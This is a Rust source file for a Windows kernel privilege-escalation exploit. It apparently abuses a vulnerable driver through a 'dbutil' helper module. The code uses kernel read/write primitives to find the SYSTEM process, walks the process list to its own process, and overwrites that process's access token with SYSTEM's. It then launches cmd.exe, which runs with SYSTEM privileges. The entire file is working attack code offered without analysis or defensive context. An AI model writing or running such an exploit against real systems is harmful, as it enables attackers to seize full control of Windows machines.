use dbutil::{get_kernel_base, open_dev, read_ptr, write_ptr};
use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};

const PID_OFFSET: usize = 0x440;
const APLINKS_OFFSET: usize = 0x448;
const TOKEN_OFFSET: usize = 0x4B8;

fn main() {
    let hdev = unsafe { open_dev() };

    let lpisp = unsafe {
        let hkernel = LoadLibraryA("ntoskrnl.exe\0".as_ptr() as _);
        let local_isp = GetProcAddress(hkernel, "PsInitialSystemProcess\0".as_ptr() as _);
        local_isp as usize - hkernel as usize + get_kernel_base()
    };

    std::io::Read::read(&mut std::io::stdin(), &mut [0u8]).unwrap();

    let isp = read_ptr(hdev, lpisp);
    let systoken = read_ptr(hdev, isp + TOKEN_OFFSET);

    let mut curproc = isp;
    let mypid = std::process::id();
    let mut curpid = 0;
    while curpid != mypid {
        curproc = read_ptr(hdev, curproc + APLINKS_OFFSET);
        curproc -= APLINKS_OFFSET;
        curpid = read_ptr(hdev, curproc + PID_OFFSET) as _;
    }

    write_ptr(hdev, curproc + TOKEN_OFFSET, systoken);
    std::process::Command::new("cmd.exe").spawn().unwrap();
}
